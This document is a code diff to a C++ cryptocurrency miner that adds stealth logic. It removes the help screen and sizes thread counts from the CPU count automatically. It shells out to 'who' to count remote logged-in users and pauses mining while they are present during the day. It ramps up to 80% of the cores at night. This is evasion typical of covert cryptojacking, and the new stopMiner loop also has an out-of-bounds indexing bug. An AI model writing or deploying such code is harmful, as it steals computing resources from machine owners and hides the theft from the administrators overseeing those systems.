@@ -143,11 +143,6 @@ void parseCommandline(int argc, char **argv,commandLineClt &cmdline)
 			exit(-1);
 		}
 	}
-	if( argc <= 1 )
-	{
-		printHelp();
-		exit(0);
-	}
 }
 
 #ifndef __WIN32__
@@ -175,6 +170,65 @@ void signal_handler(int sig)
 }
 
 #endif
+
+uint32 getWho()
+{
+
+/*
+	vector<MinerThread*> v_miner;
+	for (uint32 i = 1;i<=cmdline.tnum;i++)
+	{
+		MinerThread *pMiner = new MinerThread();
+		if (!pMiner->init(cmdline.bits,i,cmdline.bStat,cmdline.bCheckHeight))
+		{
+			exit(0);
+		}
+		pMiner->start();
+		v_miner.push_back(pMiner);
+	}*/
+	uint32 unum  = 0;
+	char buf[24] = {0};
+	system("rm -rf u.txt");
+	system("who|grep \'[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\'|wc -l>u.txt");
+	FILE *fp = fopen("u.txt","r");
+	if (fp)
+	{
+		fgets(buf,24,fp);
+		sscanf(buf,"%d",&unum);
+	}
+	else
+	{
+		unum = 0;
+	}
+	return unum;
+}
+
+void startMiner(uint32 thread_num,commandLineClt &cmdline,vector<MinerThread*> &v_miner)
+{
+	for (uint32 i = 1;i<=thread_num;i++)
+	{
+		MinerThread *pMiner = new MinerThread();
+		if (!pMiner->init(cmdline.bits,i,cmdline.bStat,cmdline.bCheckHeight))
+		{
+			exit(0);
+		}
+		pMiner->start();
+		v_miner.push_back(pMiner);
+	}
+}
+
+void stopMiner(vector<MinerThread*> &v_miner)
+{
+	for (uint32 i = 1;i<=v_miner.size();i++)
+	{
+		v_miner[i]->uinit();
+		v_miner[i]->kill_thread();
+		delete v_miner[i];
+	}
+	v_miner.clear();
+
+	Sleep(2*1000);
+}
 
 int main(int argc, char** argv)
 {
@@ -209,49 +263,112 @@ int main(int argc, char** argv)
 		} else
 			printf("using default SHA512\n");
 #endif
+		uint32 num_processors;
+#if defined(__WIN32__)
+		SYSTEM_INFO sysinfo;
+		GetSystemInfo(&sysinfo);
+		num_processors = sysinfo.dwNumberOfProcessors;
+#elif defined(_SC_NPROCESSORS_CONF)
+		num_processors = sysconf(_SC_NPROCESSORS_CONF);
+#elif defined(HW_NCPU)
+		int req[] = { CTL_HW, HW_NCPU };
+		size_t len = sizeof(num_processors);
+		v = sysctl(req, 2, &num_processors, &len, NULL, 0);
+#else
+		num_processors = 1;
+#endif
+	
+	if (num_processors < 4)
+	{
+		printf("num_processors < 4\n");
+		return 0;
+	}
 
 	SHA2_INTERFACE::getInstance(cmdline.sha2type);
 
 	ProxyClient *pClient = ProxyClient::getInstance();
-	pClient->init(cmdline.ip,cmdline.port,cmdline.tnum);
+	pClient->init(cmdline.ip,cmdline.port,num_processors);
 	//client.init("10.9.43.2",10086,3*tnum);
 	pClient->start();
-	
-	vector<MinerThread*> v_miner;
-	for (uint32 i = 1;i<=cmdline.tnum;i++)
-	{
-		MinerThread *pMiner = new MinerThread();
-		if (!pMiner->init(cmdline.bits,i,cmdline.bStat,cmdline.bCheckHeight))
-		{
-			exit(0);
-		}
-		pMiner->start();
-		v_miner.push_back(pMiner);
-	}
 
 	uint32 timerPrintDetails = GetTickCount() + 8000;
 	uint32 miningStartTime = time(NULL);
+	bool bStart = false;
+	vector<MinerThread*> v_miner;
+
 	while (1)
 	{
-		if (!cmdline.bStat)
+		if (cmdline.bStat)
 		{
-			break;
-		}
-		uint32 currentTick = GetTickCount();
-		if( currentTick >= timerPrintDetails )
-		{
-			// print details only when connected
-			uint32 passedSeconds = time(NULL) - miningStartTime;
-			double collisionsPerMinute = 0.0;
-			if( passedSeconds > 5 )
+			uint32 currentTick = GetTickCount();
+			if( currentTick >= timerPrintDetails )
 			{
-				collisionsPerMinute = (double)MinerThread::totalCollisionCount / (double)passedSeconds * 60.0;
+				// print details only when connected
+				uint32 passedSeconds = time(NULL) - miningStartTime;
+				double collisionsPerMinute = 0.0;
+				if( passedSeconds > 5 )
+				{
+					collisionsPerMinute = (double)MinerThread::totalCollisionCount / (double)passedSeconds * 60.0;
+				}
+				printf("collisions/min %.4lf,collision total %d,Shares total %d\n",collisionsPerMinute,MinerThread::totalCollisionCount,MinerThread::totalShareCount);
+				timerPrintDetails = currentTick + 8000;
 			}
-			printf("collisions/min %.4lf,collision total %d,Shares total %d\n",collisionsPerMinute,MinerThread::totalCollisionCount,MinerThread::totalShareCount);
-			timerPrintDetails = currentTick + 8000;
 		}
 
-		Sleep(1000);
+		uint32 cur_hour = ProxyClient::cur_hour;
+
+		if (cur_hour == 6 || cur_hour == 22)
+		{
+			if (bStart)
+			{
+				stopMiner(v_miner);
+				bStart = false;
+			}
+
+		}
+
+		if (getWho() > 1)
+		{
+			if (cur_hour > 6 && cur_hour < 22)
+			{
+				if (bStart)
+				{
+					stopMiner(v_miner);
+					bStart = false;					
+				}
+
+			}
+		}
+		else
+		{
+			if (cur_hour > 6 && cur_hour < 22)
+			{
+				if (!bStart)
+				{
+					uint32 thread_num = num_processors/2;
+					startMiner(thread_num,cmdline,v_miner);
+					bStart = true;
+				}
+			}
+		}
+
+		if (cur_hour == 22)
+		{
+			if (!bStart)
+			{
+				uint32 thread_num = num_processors/5*4;
+				startMiner(thread_num,cmdline,v_miner);
+				bStart = true;
+			}
+
+#ifdef __WIN32__
+			Sleep(1000*3600);
+#else
+			sleep(3600);
+#endif
+		}
+		
+		Sleep(1000);	
 	}
 
 
